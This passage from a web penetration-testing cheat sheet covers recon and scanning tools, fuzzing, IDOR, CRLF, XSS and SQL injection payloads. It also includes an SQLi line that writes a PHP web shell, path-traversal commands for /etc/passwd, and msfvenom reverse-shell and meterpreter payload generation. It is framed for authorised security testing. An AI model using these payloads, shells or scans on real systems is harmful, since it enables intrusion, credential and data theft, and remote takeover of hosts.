```

| Option | Description |
| --- | --- |
| -u | The target URL (required, unless \[--stdin \| --resume-from\] is used) |
| --stdin | Read URL(s) from STDIN |
| -a/-A | Sets the User-Agent (default: feroxbuster\/x.x.x) \/ Use a random User-Agent |
| -x | File extension(s) to search for (ex: -x php -x pdf,js) |
| -m | Which HTTP request method(s) should be sent (default: GET) |
| --data | Request's body; can read data from a file if input starts with an \@(ex: \@post.bin) |
| -H | Specify HTTP headers to be used in each request (ex: -H header:val -H 'stuff:things') |
| -b | Specify HTTP cookies to be used in each request (ex: -b stuff=things) |
| -Q | Request's URL query parameters (ex: -Q token=stuff -Q secret=key) |
| -f | Append \/ to each request's URL |
| -s | Status Codes to include (allow list) (default: 200,204,301,302,307,308,401,403,405) |
| -T | Number of seconds before a client's request times out (default: 7) |
| -k | Disables TLS certificate validation for the client |
| -t | Number of concurrent threads (default: 50) |
| -n | Do not scan recursively |
| -w | Path to the wordlist |
| --auto-bail | Automatically stop scanning when an excessive amount of errors are encountered |
| -B | Automatically request likely backup extensions for "found" URLs (default: ~, .bak, .bak2, .old, .1) |
| -q | Hide progress bars and banner (good for tmux windows w/ notifications) |
| -o | Output file to write results to (use w/ --json for JSON entries) |

### snallygaster

Download the latest version from [GitHub](https://github.com/hannob/snallygaster/releases). See how to [install](#0-install-tools-and-setup) the tool.

Search a web server for sensitive files:

```bash
snallygaster --nowww somesite.com | tee snallygaster_results.txt

for subdomain in $(cat subdomains_live_short_http.txt); do snallygaster --nohttps --nowww "${subdomain}"; done | tee snallygaster_http_results.txt

for subdomain in $(cat subdomains_live_short_https.txt); do snallygaster --nohttp --nowww "${subdomain}"; done | tee snallygaster_https_results.txt
```

### IIS Tilde Short name Scanning

Download:

```bash
git clone https://github.com/irsdl/IIS-ShortName-Scanner && cd IIS-ShortName-Scanner/release
```

Search an IIS server for files and directories:

```fundamental
java -jar iis_shortname_scanner.jar 2 30 https://somesite.com
```

### WhatWeb

Identify a website:

```fundamental
whatweb -v somesite.com
```

### Parsero

Test all `robots.txt` entries:

```fundamental
parsero -sb -u somesite.com
```

### EyeWitness

Grab screenshots from websites:

```fundamental
eyewitness --no-prompt --no-dns --threads 5 --timeout 3 -d eyewitness_results -f subdomains_live_long.txt
```

To check the screenshots, navigate to `eyewitness_results/screens` directory.

### Wordlists

You can find `rockyou.txt` inside `/usr/share/wordlists/` directory or inside [SecLists](https://github.com/danielmiessler/SecLists) - a useful collection of multiple types of wordlists for security assessments.

Install SecLists (the collection will be stored at `/usr/share/seclists/` directory):

```bash
apt-get update && apt-get install seclists
```

My contribution to the SecLists: [danielmiessler/SecLists/tree/master/Fuzzing/Amounts](https://github.com/danielmiessler/SecLists/tree/master/Fuzzing/Amounts)

Another popular wordlist collections:

* [ayoubfathi/leaky-paths](https://github.com/ayoubfathi/leaky-paths)
* [xmendez/wfuzz](https://github.com/xmendez/wfuzz)
* [assetnote/commonspeak2-wordlists](https://github.com/assetnote/commonspeak2-wordlists)
* [weakpass.com/wordlist](https://weakpass.com/wordlist)
* [packetstormsecurity.com/Crackers/wordlists](https://packetstormsecurity.com/Crackers/wordlists)

## 2. Scanning/Enumeration

Keep in mind that web applications or services can be hosted on other ports besides 80 (HTTP) and 443 (HTTPS), e.g., they can be hosted on port 8443 (HTTPS).

Keep in mind that on ports 80 (HTTP) and 443 (HTTPS) a web server can host different web applications or services. Use [Ncat](#ncat) or Telnet for banner grabbing.

Keep in mind that on different URL paths a web server can host different web applications or services, e.g., `somesite.com/app_one/` and `somesite.com/app_two/`.

While scanning for vulnerabilities or running other intensive scans, periodically check the web application or service if it crashed, so that you can alert your client as soon as possible; or in case you got rate limited by the web application firewall (WAF) or some other security product, so that you can pause your scans because all your subsequent requests will be blocked and your results will be incomplete.

If a web application or service all of sudden stops responding, try to access the web application or service using your mobile data (4G/5G), i.e., using a different IP. It is possible that your current IP was temporarily blocked.

Send an email message to a non-existent address at target's domain, it will often reveal useful internal network information through a nondelivery notification (NDN).

Get a free [Nessus Community](https://community.tenable.com/s/article/Nessus-Essentials), and if you can afford it, get [Burp Suite Professional](https://portswigger.net/burp) or [Caido](https://caido.io).

### 2.1 Useful Websites

* [ipaddressguide.com/cidr](https://www.ipaddressguide.com/cidr)
* [account.arin.net/public/cidrCalculator](https://account.arin.net/public/cidrCalculator)
* [calculator.net/ip-subnet-calculator.html](https://www.calculator.net/ip-subnet-calculator.html)
* [speedguide.net/ports.php](https://www.speedguide.net/ports.php)
* [securityheaders.com](https://securityheaders.com)
* [csp-evaluator.withgoogle.com](https://csp-evaluator.withgoogle.com) - Content Security Policy evaluator

### Nmap

**For better results, use IPs instead of domain names.**

Ping sweep, map live hosts:

```fundamental
nmap -sn -oG nmap_ping_sweep_results.txt 192.168.8.0/24

nmap -sn -oG nmap_ping_sweep_results.txt -iL cidrs.txt
```

**Some web servers will not respond to ping (ICMP) requests, so the mapping of the live hosts will not be accurate.**

Extract live hosts from the results:

```bash
grep -Po '(?<=Host\:\ )[^\s]+' nmap_ping_sweep_results.txt | sort -uf | tee -a ips_live.txt
```

TCP scan, all ports:

```fundamental
nmap -nv -sS -sV -sC -Pn -oN nmap_tcp_results.txt -p- 192.168.8.0/24

nmap -nv -sS -sV -sC -Pn -oN nmap_tcp_results.txt -p- -iL cidrs.txt
```

Automate TCP scan:

```bash
mkdir nmap_tcp_results

for ip in $(cat ips_live.txt); do nmap -nv -sS -sV -sC -Pn -oN "nmap_tcp_results/nmap_tcp_results_${ip//./_}.txt" -p- "${ip}"; done
```

UDP scan, only important ports:

```fundamental
nmap -nv -sU -sV -sC -Pn -oN nmap_udp_results.txt -p 53,67,68,69,88,123,135,137,138,139,161,162,389,445,500,514,631,1900,4500 192.168.8.0/24

nmap -nv -sU -sV -sC -Pn -oN nmap_udp_results.txt -p 53,67,68,69,88,123,135,137,138,139,161,162,389,445,500,514,631,1900,4500 -iL cidrs.txt
```

Automate UDP scan:

```bash
mkdir nmap_udp_results

for ip in $(cat ips_live.txt); do nmap -nv -sU -sV -sC -Pn -oN "nmap_udp_results/nmap_udp_results_${ip//./_}.txt" -p 53,67,68,69,88,123,135,137,138,139,161,162,389,445,500,514,631,1900,4500 "${subdomain}"; done
```

| Option | Description |
| --- | --- |
| -sn | Ping scan - disable port scan |
| -Pn | Treat all hosts as online -- skip host discovery |
| -n/-R | Never do DNS resolution/Always resolve (default: sometimes) |
| -sS/sT/sA | TCP SYN/Connect()/ACK |
| -sU | UDP scan |
| -p/-p- | Only scan specified ports/Scan all ports |
| --top-ports | Scan <number> most common ports |
| -sV | Probe open ports to determine service/version info |
| -O | Enable OS detection |
| -sC | Same as --script=default |
| --script | Script scan (takes time to finish) |
| --script-args | Provide arguments to scripts |
| --script-help | Show help about scripts |
| -oN/-oX/-oG | Output scan in normal, XML, and Grepable format |
| -v | Increase verbosity level (use -vv or more for greater effect) |
| --reason | Display the reason a port is in a particular state |
| -A | Enable OS detection, version detection, script scanning, and traceroute |

All Nmap's scripts are located at `/usr/share/nmap/scripts/` directory. Read more about the scripts [here](https://nmap.org/nsedoc).

NSE examples:

```fundamental
nmap -nv --script='mysql-brute' --script-args='userdb="users.txt", passdb="rockyou.txt"' 192.168.8.5 -p 3306

nmap -nv --script='dns-brute' --script-args='dns-brute.domain="somedomain.com", dns-brute.hostlist="subdomains-top1mil.txt"'

nmap -nv --script='ssl-heartbleed' -iL cidrs.txt
```

You can find `rockyou.txt` and `subdomains-top1mil.txt` wordlists in [SecLists](#wordlists).

I prefer to use [Nuclei](#nuclei) for vulnerability scanning.

### testssl.sh

Installation:

```bash
apt-get update && apt-get -y install testssl.sh
```

Test an SSL/TLS certificate (e.g., SSL/TLS ciphers, protocols, etc.):

```fundamental
testssl --openssl /usr/bin/openssl -oH testssl_results.html somesite.com
```

You can also use testssl.sh to exploit SSL/TLS vulnerabilities.

### OpenSSL

Test a web server for Heartbleed vulnerability:

```bash
for subdomain in $(cat subdomains_live.txt); do res=$(echo "Q" | openssl s_client -connect "${subdomain}:443" 2>&1 | grep 'server extension "heartbeat" (id=15)'); if [[ ! -z $res ]]; then echo "${subdomain}"; fi; done | tee openssl_heartbleed_results.txt

for subdomain in $(cat subdomains_live_short_https.txt); do res=$(echo "Q" | openssl s_client -connect "${subdomain}" 2>&1 | grep 'server extension "heartbeat" (id=15)'); if [[ ! -z $res ]]; then echo "${subdomain}"; fi; done | tee openssl_heartbleed_results.txt
```

### keytool

Grab SSL/TLS certificate:

```fundamental
keytool -printcert -rfc -sslserver somesite.com > keytool_results.txt

openssl x509 -noout -text -in keytool_results.txt
```

Use [uncover](#uncover) with Shodan and Censys SSL/TLS Dorks to find more in-scope subdomains.

### uncover

Installation:

```fundamental
go install -v github.com/projectdiscovery/uncover/cmd/uncover@latest
```

Set your API keys in `/root/.config/uncover/provider-config.yaml` as following:

```fundamental
shodan:
  - SHODAN_API_KEY
censys:
  - CENSYS_API_ID:CENSYS_API_SECRET
```

Gather IPs based on the SSL/TLS certificate subject common name (CN):

```fundamental
uncover -json -o uncover_cert_shodan_results.json -l 100 -e shodan -q 'ssl.cert.subject.CN:"*.somedomain.com"'

uncover -json -o uncover_cert_censys_results.json -l 100 -e censys -q 'cert.parsed.subject.common_name:"*.somedomain.com"'
```

## 3. Vulnerability Assesment/Exploiting

Always try the null session login, i.e., no password login, or search the Internet for default credentials for a specific web application.

Try to manipulate cookies or JWT tokens to gain access or elevate privileges. On logout, always check if any of the cookies or JWT tokens are still valid.

Always inspect web browser's local storage, especially if testing a single-page application (SPA).

Try to transform, e.g., an HTTP POST request into an HTTP GET request, i.e., into a query string, and see how a server will react to it.

Turn off JavaScript in your web browser and check the web application behaviour again.

Check the web application behaviour on a mobile device as some features might work differently. Try spoofing your User-Agent or try to visiting `m.somesite.com`.

If you want to automate your code injection testing, check the [Wordlists](#wordlists) sub-section for code injection wordlists. Some of the wordlists also include obfuscated code injections.

If you see any amounts or quantities, try to use [danielmiessler/SecLists/tree/master/Fuzzing/Amounts](https://github.com/danielmiessler/SecLists/tree/master/Fuzzing/Amounts) wordlist as it might cause unintended behavior, errors, or even bypass the minimum and maximum boundaries.

**Don't forget to clean up after yourself. Remove all the created artifacts, incl. malware, exploits, tools, scripts, etc., and revert all the settings and changes from a target host after you are done testing.**

### 3.1 Useful Websites

* [cvedetails.com](https://www.cvedetails.com)
* [exploit-db.com](https://www.exploit-db.com)
* [cxsecurity.com](https://cxsecurity.com/wlb)
* [hakluke/weaponised-XSS-payloads](https://github.com/hakluke/weaponised-XSS-payloads)
* [namecheap.com](https://www.namecheap.com) - buy domains for cheap
* [streaak/keyhacks](https://github.com/streaak/keyhacks) - validate API keys
* [swisskyrepo/PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings)
* [jwt.io](https://jwt.io)
* [portswigger.net/web-security](https://portswigger.net/web-security)
* [bigiamchallenge.com](https://bigiamchallenge.com) - nice AWS CTF

### Collaborator Servers

Used when trying to exploit an open redirect, blind cross-site scripting (XSS), DNS and HTTP interactions, etc.

* [interactsh.com](https://app.interactsh.com)
* [Burp Collaborator](https://portswigger.net/burp/documentation/collaborator)
* [canarytokens.org](https://canarytokens.org/generate)
* [webhook.site](https://webhook.site)
	
### Subdomain Takeover

Gather as much information as you can for a specified target, see how in [1. Reconnaissance](#1-reconnaissance).

Gather organization names with [WHOIS](#whois), and canonical names with [host](#host).

You can double check if subdomains are dead with [dig](#dig) or alive and [httpx](#httpx).

Check if hosting providers for the found subdomains are vulnerable to subdomain takeover at [EdOverflow/can-i-take-over-xyz](https://github.com/EdOverflow/can-i-take-over-xyz). Credits to the author!

Biggest cloud service providers:

* [aws.amazon.com](https://aws.amazon.com)
* [azure.microsoft.com](https://azure.microsoft.com)
* [cloud.google.com](https://cloud.google.com)
* [wordpress.com](https://wordpress.com)
* [shopify.com](https://www.shopify.com)

### Subzy

Installation:

```fundamental
go install -v github.com/lukasikic/subzy@latest
```

Check for subdomains takeover:

```fundamental
subzy -concurrency 100 -timeout 3 -targets subdomains_errors.txt | tee subzy_results.txt
```

### subjack

Installation:

```bash
go install -v github.com/haccer/subjack@latest
```

Check for subdomains takeover:

```fundamental
subjack -v -o subjack_results.json -t 100 -timeout 3 -a -m -w subdomains_errors.txt
```

### Bypassing the 401 and 403

Find out how to bypass 4xx HTTP response status codes in my project at [ivan-sincek/forbidden](https://github.com/ivan-sincek/forbidden).

### Nikto

Scan a web server:

```fundamental
nikto -output nikto_results.txt -h somesite.com -p 80
```

### WPScan

Scan a WordPress website:

```fundamental
wpscan -o wpscan_results.txt --url somesite.com
```

### Nuclei

Installation and updating:

```bash
go install -v github.com/projectdiscovery/nuclei/v3/cmd/nuclei@latest

nuclei -up && nuclei -ut
```

Vulnerability scan, all templates:

```bash
nuclei -c 500 -o nuclei_results.txt -l subdomains_live_long_2xx_4xx.txt

cat nuclei_results.txt | grep -Po '(?<=\]\ ).+' | sort -uf > nuclei_sorted_results.txt
```

Only subdomain takeover:

```fundamental
nuclei -c 500 -t takeovers -o nuclei_takeover_results.txt -l subdomains_live.txt
```

### Arjun

Discover request parameters:

```fundamental
arjun --stable -oT arjun_results.txt -oJ arjun_results.json -T 3 -t 5 --passive -m GET -u https://somesite.com

arjun --stable -oT arjun_results.txt -oJ arjun_results.json -T 3 -t 5 --passive -m GET -i subdomains_live_long_2xx.txt
```

### WFUZZ

Fuzz directories:

```fundamental
wfuzz -t 30 -f wfuzz_results.txt --hc 404,405 -X GET -u https://somesite.com/WFUZZ -w directory-list-lowercase-2.3-medium.txt
```

Fuzz parameter values:

```fundamental
wfuzz -t 30 -f wfuzz_results.txt --hc 404,405 -X GET -u "https://somesite.com/someapi?someparam=WFUZZ" -w somewordlist.txt

wfuzz -t 30 -f wfuzz_results.txt --hc 404,405 -X POST -H "Content-Type: application/x-www-form-urlencoded" -u "https://somesite.com/someapi" -d "someparam=WFUZZ" -w somewordlist.txt

wfuzz -t 30 -f wfuzz_results.txt --hc 404,405 -X POST -H "Content-Type: application/json" -u "https://somesite.com/someapi" -d "{\"someparam\": \"WFUZZ\"}" -w somewordlist.txt
```

Fuzz parameters:

```fundamental
wfuzz -t 30 -f wfuzz_results.txt --hc 404,405 -X GET -u "https://somesite.com/someapi?WFUZZ=somevalue" -w somewordlist.txt

wfuzz -t 30 -f wfuzz_results.txt --hc 404,405 -X POST -H "Content-Type: application/x-www-form-urlencoded" -u "https://somesite.com/someapi" -d "WFUZZ=somevalue" -w somewordlist.txt

wfuzz -t 30 -f wfuzz_results.txt --hc 404,405 -X POST -H "Content-Type: application/json" -u "https://somesite.com/someapi" -d "{\"WFUZZ\": \"somevalue\"}" -w somewordlist.txt
```

Additional example, internal SSRF fuzzing:

```fundamental
wfuzz -t 30 -f wfuzz_results.txt --hc 404,405 -X GET -u "https://somesite.com/someapi?url=127.0.0.1:WFUZZ" -w ports.txt

wfuzz -t 30 -f wfuzz_results.txt --hc 404,405 -X GET -u "https://somesite.com/someapi?url=WFUZZ:80" -w ips.txt
```

| Option | Description |
| --- | --- |
| -f | Store results in the output file |
| -t | Specify the number of concurrent connections (10 default) |
| -s | Specify time delay between requests (0 default) |
| -u | Specify a URL for the request |
| -w | Specify a wordlist file |
| -X | Specify an HTTP method for the request, i.e., HEAD or FUZZ |
| -b | Specify a cookie for the requests |
| -d | Use post data |
| -H | Use header |
| --hc/--hl/--hw/--hh | Hide responses with the specified code/lines/words/chars |
| --sc/--sl/--sw/--sh| Show responses with the specified code/lines/words/chars |
| --ss/--hs| Show/hide responses with the specified regex within the content |

### Insecure Direct Object Reference (IDOR)

First, try to simply change one value to another, e.g., change `victim@gmail.com` to `hacker@gmail.com`, change some ID from `1` to `2`, etc.

It is likely that lower number IDs will relate to some higher privilege accounts or roles.

Second, try parameter pollution:

```fundamental
"email":"hacker@gmail.com,victim@gmail.com"
"email":"hacker@gmail.com victim@gmail.com"
"email":"hacker@gmail.com","email":"victim@gmail.com"
"email":"victim@gmail.com,hacker@gmail.com"
"email":"victim@gmail.com hacker@gmail.com"
"email":"victim@gmail.com","email":"hacker@gmail.com"
"email":("hacker@gmail.com","victim@gmail.com")
"email":["hacker@gmail.com","victim@gmail.com"]
"email":{"hacker@gmail.com","victim@gmail.com"}
"email":("victim@gmail.com","hacker@gmail.com")
"email":["victim@gmail.com","hacker@gmail.com"]
"email":{"victim@gmail.com","hacker@gmail.com"}
email=hacker%40gmail.com,victim%40gmail.com
email=hacker%40gmail.com%20victim%40gmail.com
email=hacker%40gmail.com&email=victim%40gmail.com
email[]=hacker%40gmail.com&email[]=victim%40gmail.com
email=victim%40gmail.com,hacker%40gmail.com
email=victim%40gmail.com%20hacker%40gmail.com
email=victim%40gmail.com&email=hacker%40gmail.com
email[]=victim%40gmail.com&email[]=hacker%40gmail.com
```

To generate the above output, run [param_pollution.py](https://github.com/ivan-sincek/penetration-testing-cheat-sheet/blob/master/scripts/param_pollution.py):

```fundamental
python3 param_pollution.py -n email -i victim@gmail.com -t hacker@gmail.com
```

### HTTP Response Splitting

Also known as CRLF injection. CRLF refers to carriage return (`ASCII 13`, `\r`) and line feed (`ASCII 10`, `\n`).

When encoded, `\r` refers to `%0D` and `\n` refers to `%0A`.

Fixate a session cookie:

```fundamental
somesite.com/redirect.asp?origin=somesite.com%0D%0ASet-Cookie:%20ASPSESSION=123456789
```

Open redirect:

```fundamental
somesite.com/home.php?marketing=winter%0D%0ALocation:%20https%3A%2F%2Fgithub.com
```

Session fixation and open redirection are one of many techniques used in combination with HTTP response splitting. Search the Internet for more techniques.

### Cross-Site Scripting (XSS)

Simple cross-site scripting (XSS) payloads:

```html
<script>alert(1)</script>

<script src="https://myserver.com/xss.js"></script>

<img src="https://github.com/favicon.ico" onload="alert(1)">
```

Hosting JavaScript on [Pastebin](https://pastebin.com) won't work because Pastebin always returns `text/plain` content type.

Find out more about reflected and stored cross-site scripting (XSS) attacks, as well as cross-site request forgery (XSRF/CSRF) attacks in my project at [ivan-sincek/xss-catcher](https://github.com/ivan-sincek/xss-catcher).

Valid RFC emails with embedded XSS:

```html
user+(<script>alert(1)</script>)@somedomain.com

user@somedomain(<script>alert(1)</script>).com

"<script>alert(1)</script>"@somedomain.com
```

### SQL Injection

**The following payloads were tested on MySQL database. Note that MySQL requires a whitespace character between the comment symbol and the next character.**

If you need to URL encode the whitespace character, use `%20` or `+` instead.

Try to produce database errors by injecting a single-quote, back-slash, double-hyphen, forward-slash, or period.

**Always make sure to properly close the surrounding code.**

Read this OWASP [article](https://owasp.org/www-community/attacks/SQL_Injection_Bypassing_WAF) to learn how to bypass WAF.

---

Boolean-based SQLi:

```fundamental
' OR 1=1-- 

' OR 1=2-- 
```

---

Union-based SQLi:

```fundamental
' UNION SELECT 1,2,3,4-- 

' UNION SELECT NULL,NULL,NULL,NULL-- 

' UNION SELECT 1,concat_ws('|',database(),current_user(),version()),3,4-- 

' UNION SELECT 1,concat_ws('|',table_schema,table_name,column_name,data_type,character_maximum_length),3,4 FROM information_schema.columns-- 

' UNION SELECT 1,load_file('..\\..\\apache\\conf\\httpd.conf'),3,4-- 
```

If using, e.g., `1,2,3,4` does not work, try using `NULL,NULL,NULL,NULL` respectively.

Use the union-based SQLi only when you are able to use the same communication channel to both launch the attack and gather results.

The goal is to determine the exact number of columns in the SQL query and to figure out which of them are shown back to the user.

Another way to determine the exact number of columns is by using, e.g., `' ORDER BY 1-- `, where `1` is the column number used for sorting - incrementing it by one on each try.

---

Time-based SQLi:

```fundamental
' AND (SELECT 1 FROM (SELECT sleep(2)) test)-- 

' AND (SELECT 1 FROM (SELECT CASE user() WHEN 'root@127.0.0.1' THEN sleep(2) ELSE sleep(0) END) test)-- 

' AND (SELECT 1 FROM (SELECT CASE substring(current_user(),1,1) WHEN 'r' THEN sleep(2) ELSE sleep(0) END) test)-- 

' AND (SELECT CASE substring(password,1,1) WHEN '$' THEN sleep(2) ELSE sleep(0) END FROM users WHERE id = 1)-- 

' AND IF(version() LIKE '5%',sleep(2),sleep(0))-- 
```

Use the time-based SQLi when you are not able to see the results.

---

Check for the existance/correctness:

```fundamental
' AND (SELECT 'exists' FROM users) = 'exists

' AND (SELECT 'exists' FROM users WHERE username = 'administrator') = 'exists

' AND (SELECT 'correct' FROM users WHERE username = 'administrator' AND length(password) < 8 ) = 'correct

' AND (SELECT CASE substring(password,1,1) WHEN '$' THEN to_char(1/0) ELSE 'correct' END FROM users WHERE username = 'administrator') = 'correct

'||(SELECT CASE substring(password,1,1) WHEN '$' THEN to_char(1/0) ELSE '' END FROM users WHERE username = 'administrator')||'
```

---

Inject a [simple PHP web shell](https://github.com/ivan-sincek/php-reverse-shell/blob/master/src/web/simple_php_web_shell_get.php) based on HTTP GET request:

```fundamental
' UNION SELECT '', '', '', '<?php if(isset($_GET["command"])){echo shell_exec($_GET["command"]);} ?>' INTO DUMPFILE '..\\..\\htdocs\\backdoor.php'-- 

' UNION SELECT '', '', '', '<?php $p="command";$o=null;if(isset($_SERVER["REQUEST_METHOD"])&&strtolower($_SERVER["REQUEST_METHOD"])==="get"&&isset($_GET[$p])&&($_GET[$p]=trim($_GET[$p]))&&strlen($_GET[$p])>0){$o=@shell_exec("($_GET[$p]) 2>&1");if($o===false){$o="ERROR: The function might be disabled.";}else{$o=str_replace("<","&lt;",$o);$o=str_replace(">","&gt;",$o);}} ?><!DOCTYPE html><html lang="en"><head><meta charset="UTF-8"><title>Simple PHP Web Shell</title><meta name="author" content="Ivan Šincek"><meta name="viewport" content="width=device-width, initial-scale=1.0"></head><body><pre><?php echo $o;unset($o);unset($_GET[$p]); ?></pre></body></html>' INTO DUMPFILE '..\\..\\htdocs\\backdoor.php'-- 
```

**To successfully inject a web shell, the current database user must have a write permission.**

### sqlmap

Inject SQL code into request parameters:

```fundamental
sqlmap -a -u somesite.com/index.php?username=test&password=test

sqlmap -a -u somesite.com/index.php --data username=test&password=test

sqlmap -a -u somesite.com/index.php --data username=test&password=test -p password
```

| Option | Description |
| --- | --- |
| -u | Target URL |
| -H | Extra HTTP header |
| --data | Data string to be sent through POST |
| --cookie | HTTP Cookie header value |
| --proxy | Use a proxy to connect to the target URL (\[protocol://\]host\[:port\]) |
| -p | Testable parameter(s) |
| --level | Level of tests to perform (1-5, default: 1) |
| --risk | Risk of tests to perform (1-3, default: 1) |
| -a | Retrieve everything |
| -b | Retrieve DBMS banner |
| --dump-all | Dump all DBMS databases tables entries |
| --os-shell | Prompt for an interactive operating system shell |
| --os-pwn | Prompt for an OOB shell, Meterpreter, or VNC |
| --sqlmap-shell | Prompt for an interactive sqlmap shell |
| --wizard | Simple wizard interface for beginner users |
| --dbms | To do. |

### dotdotpwn

Traverse a path (e.g., `somesite.com/../../../etc/passwd`):

```fundamental
dotdotpwn -q -m http -S -o windows -f /windows/win.ini -k mci -h somesite.com

dotdotpwn -q -m http -o unix -f /etc/passwd -k root -h somesite.com

dotdotpwn -q -m http-url -o unix -f /etc/hosts -k localhost -u 'https://somesite.com/index.php?file=TRAVERSAL'
```

Try to prepend a protocol such as `file://`, `gopher://`, `dict://`, `php://`, `jar://`, `ftp://`, `tftp://`, etc., to the file path; e.g, `file://TRAVERSAL`.

Check some additional directory traversal tips at [swisskyrepo/PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Directory%20Traversal/README.md). Credits to the author!

| Option | Description |
| --- | --- |
| -m | Module (http, http-url, ftp, tftp payload, stdout) |
| -h | Hostname |
| -O | Operating System detection for intelligent fuzzing (nmap) |
| -o | Operating System type if known ("windows", "unix", or "generic") |
| -d | Depth of traversals (default: 6) |
| -f | Specific filename (default: according to OS detected) |
| -S | Use SSL for HTTP and Payload module (not needed for http-url) |
| -u | URL with the part to be fuzzed marked as TRAVERSAL |
| -k | Text pattern to match in the response |
| -p | Filename with the payload to be sent and the part to be fuzzed marked with the TRAVERSAL keyword |
| -x | Port to connect (default: HTTP=80; FTP=21; TFTP=69) |
| -U | Username (default: 'anonymous') |
| -P | Password (default: 'dot(at)dot.pwn') |
| -M | HTTP Method to use when using the 'http' module (GET, POST, HEAD, COPY, MOVE, default: GET) |
| -b | Break after the first vulnerability is found |
| -C | Continue if no data was received from host |

### Web Shells

Find out more about PHP shells in my project at [ivan-sincek/php-reverse-shell](https://github.com/ivan-sincek/php-reverse-shell).

Find out more about Java/JSP shells in my project at [ivan-sincek/java-reverse-tcp](https://github.com/ivan-sincek/java-reverse-tcp).

### Send a Payload With Python

Find out how to generate a reverse shell payload for Python and send it to the target machine in my project at [ivan-sincek/send-tcp-payload](https://github.com/ivan-sincek/send-tcp-payload).

## 4. Post Exploitation

### 4.1 Useful Websites

* [swisskyrepo/PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings)
* [lolbas-project.github.io](https://lolbas-project.github.io)
* [gtfobins.github.io](https://gtfobins.github.io)

### Generate a Reverse Shell Payload for Windows OS

To generate a `Base64 encoded payload`, use one of the following MSFvenom commands, modify them to your need:

```fundamental
msfvenom --platform windows -a x86 -e x86/call4_dword_xor -p windows/shell_reverse_tcp LHOST=192.168.8.5 LPORT=9000 EXITFUNC=thread -f raw -b \x00\x0a\x0d\xff | base64 -w 0 > payload.txt

msfvenom --platform windows -a x64 -e x64/xor -p windows/x64/shell_reverse_tcp LHOST=192.168.8.5 LPORT=9000 EXITFUNC=thread -f raw -b \x00\x0a\x0d\xff | base64 -w 0 > payload.txt

msfvenom --platform windows -a x86 -e x86/call4_dword_xor -p windows/meterpreter_reverse_tcp LHOST=192.168.8.5 LPORT=9000 EXITFUNC=thread -f raw | base64 -w 0 > payload.txt

msfvenom --platform windows -a x64 -e x64/xor -p windows/x64/meterpreter_reverse_tcp LHOST=192.168.8.5 LPORT=9000 EXITFUNC=thread -f raw | base64 -w 0 > payload.txt
```

To generate a `binary file`, use one of the following MSFvenom commands, modify them to your need:

```fundamental
msfvenom --platform windows -a x86 -e x86/call4_dword_xor -p windows/shell_reverse_tcp LHOST=192.168.8.5 LPORT=9000 EXITFUNC=thread -f raw -b \x00\x0a\x0d\xff -o payload.bin

msfvenom --platform windows -a x64 -e x64/xor -p windows/x64/shell_reverse_tcp LHOST=192.168.8.5 LPORT=9000 EXITFUNC=thread -f raw -b \x00\x0a\x0d\xff -o payload.bin

msfvenom --platform windows -a x86 -e x86/call4_dword_xor -p windows/meterpreter_reverse_tcp LHOST=192.168.8.5 LPORT=9000 EXITFUNC=thread -f raw -o payload.bin

msfvenom --platform windows -a x64 -e x64/xor -p windows/x64/meterpreter_reverse_tcp LHOST=192.168.8.5 LPORT=9000 EXITFUNC=thread -f raw -o payload.bin
```

To generate a `DLL file`, use one of the following MSFvenom commands, modify them to your need:

```fundamental
msfvenom --platform windows -a x86 -e x86/call4_dword_xor -p windows/shell_reverse_tcp LHOST=192.168.8.5 LPORT=9000 EXITFUNC=thread -f dll -b \x00\x0a\x0d\xff -o payload.dll

msfvenom --platform windows -a x64 -e x64/xor -p windows/x64/shell_reverse_tcp LHOST=192.168.8.5 LPORT=9000 EXITFUNC=thread -f dll -b \x00\x0a\x0d\xff -o payload.dll
```

To generate a `standalone executable`, file use one of the following MSFvenom commands, modify them to your need:

```fundamental
msfvenom --platform windows -a x86 -e x86/call4_dword_xor -p windows/shell_reverse_tcp LHOST=192.168.8.5 LPORT=9000 EXITFUNC=thread -f exe -b \x00\x0a\x0d\xff -o payload.exe

msfvenom --platform windows -a x64 -e x64/xor -p windows/x64/shell_reverse_tcp LHOST=192.168.8.5 LPORT=9000 EXITFUNC=thread -f exe -b \x00\x0a\x0d\xff -o payload.exe

msfvenom --platform windows -a x86 -e x86/call4_dword_xor -p windows/meterpreter_reverse_tcp LHOST=192.168.8.5 LPORT=9000 EXITFUNC=thread -f exe -o payload.exe

msfvenom --platform windows -a x64 -e x64/xor -p windows/x64/meterpreter_reverse_tcp LHOST=192.168.8.5 LPORT=9000 EXITFUNC=thread -f exe -o payload.exe
```

To generate an `MSI file`, use one of the following MSFvenom commands, modify them to your need:

```fundamental
msfvenom --platform windows -a x86 -e x86/call4_dword_xor -p windows/shell_reverse_tcp LHOST=192.168.8.5 LPORT=9000 EXITFUNC=thread -f msi -b \x00\x0a\x0d\xff -o payload.msi

msfvenom --platform windows -a x64 -e x64/xor -p windows/x64/shell_reverse_tcp LHOST=192.168.8.5 LPORT=9000 EXITFUNC=thread -f msi -b \x00\x0a\x0d\xff -o payload.msi
```

Bytecode might not work on the first try due to some other bad characters. Trial and error is the key.

So far there is no easy way to generate a DLL nor MSI file with a stageless meterpreter shell due to the size issues.

### PowerShell Encoded Command

To generate a PowerShell encoded command from a PowerShell script, run the following PowerShell command:

```pwsh
[Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes([IO.File]::ReadAllText($script)))
```

To run the PowerShell encoded command, run the following command from either PowerShell or Command Prompt:

```pwsh
PowerShell -ExecutionPolicy Unrestricted -NoProfile -EncodedCommand $command
```

To decode a PowerShell encoded command, run the following PowerShell command:

```pwsh
[Text.Encoding]::Unicode.GetString([Convert]::FromBase64String($command))
```

Find out more about PowerShell reverse and bind TCP shells in my project at [ivan-sincek/powershell-reverse-tcp](https://github.com/ivan-sincek/powershell-reverse-tcp).

## 5. Password Cracking

**Google a hash before trying to crack it because you might save yourself a lot of time and trouble.**

Use [Google Dorks](#google-dorks), [Chad](#chad), or [FOCA](#foca) to find and download files, and within the files' metadata, domain usernames to brute force.

**Keep in mind that you might lockout people's accounts.**

Some web forms have CAPTCHA challenge and/or hidden submission token which may prevent you from brute forcing. If that is the case, try to submit a request without the CAPTCHA challenge response and submission token.

You can find a bunch of useful wordlists in [SecLists](#wordlists).

### 5.1 Useful Websites

* [gchq.github.io/CyberChef](https://gchq.github.io/CyberChef)
